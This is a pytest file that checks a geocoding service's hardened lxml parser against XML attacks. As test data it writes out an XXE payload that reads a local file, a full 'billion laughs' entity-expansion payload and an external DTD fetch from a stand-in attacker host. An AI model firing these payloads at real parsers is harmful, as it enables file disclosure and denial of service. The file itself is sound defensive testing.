"""The XML parser configuration is a security control, and this proves it holds.

src/api/wire/xml_ns.py sets resolve_entities=False, load_dtd=False and
no_network=True. Those three settings are the whole of this service's defence
against the standard XML attack set, and a defence nobody tests is a defence
nobody has. The tests below run real attack documents — a file-disclosure XXE
against a file that actually exists and contains a real secret, and an
exponential entity expansion — through the same admission path a request takes.

The assertions are deliberately about the SECURITY property rather than about a
status code: what matters is that the secret does not come back and the process
does not hang, not which of the closed set the request ends in.
"""

from __future__ import annotations

import os
import time

import pytest
from lxml import etree
from starlette.testclient import TestClient

from src.api.wire.xml_ns import XML_PARSER, parser
from tests.conformance import scoring_stubs

os.environ.setdefault("GCS_AMBIGUITY_TOLERANCE_M", "150.0")

GEOCODE = "/Gcs/v1/Geocode"
SECRET = "TOP-SECRET-ESINET-PRIVATE-KEY-MATERIAL"


class _FakeNtpClient:
    is_healthy = True
    offset = 0.0

    async def start(self) -> None:
        return None

    async def stop(self) -> None:
        return None


@pytest.fixture()
def client(monkeypatch):
    from src import server

    scoring_stubs.install(monkeypatch)
    monkeypatch.setattr(server, "NtpClient", lambda **kwargs: _FakeNtpClient())
    monkeypatch.setenv("GCS_GPKG_PATH", "")
    with TestClient(server.app) as c:
        yield c


@pytest.fixture()
def secret_file(tmp_path):
    path = tmp_path / "private-key.pem"
    path.write_text(SECRET, encoding="utf-8")
    return path


# ---------------------------------------------------------------------------
# The configuration itself
# ---------------------------------------------------------------------------

_INTERNAL_ENTITY = (
    b'<?xml version="1.0"?>\n'
    b'<!DOCTYPE r [<!ENTITY greeting "EXPANDED-SECRET">]>\n'
    b"<r><a>&greeting;</a></r>"
)


@pytest.mark.parametrize("candidate", ["shared", "fresh"])
def test_the_parser_does_not_expand_entities(candidate):
    """Asserted behaviourally rather than by reading the constructor flags back
    off the parser — lxml does not expose them, and behaviour is what an
    attacker interacts with anyway.

    The control below is what gives this test its teeth: the SAME document
    through lxml's default parser expands to the secret, so this is measuring
    the hardening rather than a property XML has on its own.
    """
    hardened = XML_PARSER if candidate == "shared" else parser()

    assert b"EXPANDED-SECRET" not in etree.tostring(
        etree.fromstring(_INTERNAL_ENTITY, hardened)
    )
    assert b"EXPANDED-SECRET" in etree.tostring(etree.fromstring(_INTERNAL_ENTITY))


def test_admission_uses_the_hardened_parser_and_not_its_own():
    """Two copies of a hardening configuration is exactly the drift that leaves
    one of them unhardened, so admission re-exports this one rather than
    building a second."""
    from src.api import admission

    assert admission.XML_PARSER is XML_PARSER


# ---------------------------------------------------------------------------
# XXE — file disclosure
# ---------------------------------------------------------------------------

def _xxe_document(path) -> bytes:
    uri = path.as_uri()
    return f"""<?xml version="1.0"?>
<!DOCTYPE presence [
  <!ENTITY xxe SYSTEM "{uri}">
]>
<presence xmlns="urn:ietf:params:xml:ns:pidf"
          xmlns:gp="urn:ietf:params:xml:ns:pidf:geopriv10"
          entity="pres:&xxe;@example.com">
  <tuple id="t1"><status><gp:geopriv>
    <gp:location-info>
      <ca:civicAddress xmlns:ca="urn:ietf:params:xml:ns:pidf:geopriv10:civicAddr">
        <ca:RD>&xxe;</ca:RD>
      </ca:civicAddress>
    </gp:location-info>
    <gp:usage-rules/>
  </gp:geopriv></status></tuple>
</presence>""".encode("utf-8")


def test_an_external_entity_is_never_expanded_by_the_parser(secret_file):
    """The direct check: parse the attack document and confirm the file content
    appears nowhere in the resulting tree."""
    document = _xxe_document(secret_file)
    try:
        root = etree.fromstring(document, XML_PARSER)
    except etree.XMLSyntaxError:
        return  # refused outright, which is also a pass
    assert SECRET not in etree.tostring(root, encoding="unicode")


def test_an_xxe_request_does_not_leak_the_file_over_http(client, secret_file):
    """The end-to-end check, through the real admission path. A GCS sits on an
    ESInet and answers conversion requests during a call; an XXE that reads a
    key file is an outage with a network path to it."""
    resp = client.post(GEOCODE, content=_xxe_document(secret_file))

    assert SECRET not in resp.text
    assert resp.status_code == 454


def test_the_secret_file_really_does_contain_the_secret(secret_file):
    """Guards the two tests above from passing vacuously — if the fixture ever
    stopped writing the file, they would both pass while proving nothing."""
    assert secret_file.read_text(encoding="utf-8") == SECRET


# ---------------------------------------------------------------------------
# Entity expansion — denial of service
# ---------------------------------------------------------------------------

BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE presence [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<presence xmlns="urn:ietf:params:xml:ns:pidf"
          xmlns:gp="urn:ietf:params:xml:ns:pidf:geopriv10"
          entity="pres:someone@example.com">
  <tuple id="t1"><status><gp:geopriv>
    <gp:location-info>
      <ca:civicAddress xmlns:ca="urn:ietf:params:xml:ns:pidf:geopriv10:civicAddr">
        <ca:RD>&lol9;</ca:RD>
      </ca:civicAddress>
    </gp:location-info>
    <gp:usage-rules/>
  </gp:geopriv></status></tuple>
</presence>"""


def test_entity_expansion_does_not_blow_up_the_parser():
    """A billion laughs expands to roughly 10^9 characters if entities resolve.
    With resolve_entities=False the reference is left as a reference, so the
    tree stays the size of the document."""
    start = time.monotonic()
    try:
        root = etree.fromstring(BILLION_LAUGHS, XML_PARSER)
    except etree.XMLSyntaxError:
        return  # refused outright, which is also a pass
    rendered = etree.tostring(root, encoding="unicode")
    assert len(rendered) < 100_000
    assert time.monotonic() - start < 5.0


def test_an_entity_expansion_request_is_answered_promptly(client):
    """The property that matters operationally: a worker is not pinned. If this
    ever hangs, an attacker can take the service off the air with one POST."""
    start = time.monotonic()
    resp = client.post(GEOCODE, content=BILLION_LAUGHS)
    elapsed = time.monotonic() - start

    assert elapsed < 5.0
    assert resp.status_code == 454
    assert len(resp.text) < 100_000


# ---------------------------------------------------------------------------
# External DTD — network access
# ---------------------------------------------------------------------------

EXTERNAL_DTD = b"""<?xml version="1.0"?>
<!DOCTYPE presence SYSTEM "http://attacker.invalid/evil.dtd">
<presence xmlns="urn:ietf:params:xml:ns:pidf" entity="pres:someone@example.com"/>
"""


def test_an_external_dtd_is_not_fetched(client):
    """load_dtd=False and no_network=True between them mean the reference is
    never followed. attacker.invalid does not resolve, so a fetch would show up
    as a DNS-timeout-shaped delay rather than an error — hence the clock."""
    start = time.monotonic()
    resp = client.post(GEOCODE, content=EXTERNAL_DTD)
    assert time.monotonic() - start < 5.0
    assert resp.status_code in (454, 468)
